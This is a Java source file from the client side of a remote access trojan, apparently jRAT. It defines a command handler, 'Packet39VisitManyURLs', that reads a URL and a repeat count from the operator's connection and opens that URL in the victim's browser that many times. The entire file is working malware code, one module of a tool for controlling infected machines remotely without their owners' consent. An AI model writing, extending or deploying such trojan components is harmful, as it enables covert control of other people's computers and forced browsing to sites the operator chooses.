package jrat.client.packets.incoming;

import jrat.client.Connection;

import java.net.URI;


public class Packet39VisitManyURLs implements IncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String url = con.readLine();
		int times = con.readInt();
		try {
			for (int i = 0; i < times; i++) {
				java.awt.Desktop.getDesktop().browse(new URI(url));
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

}
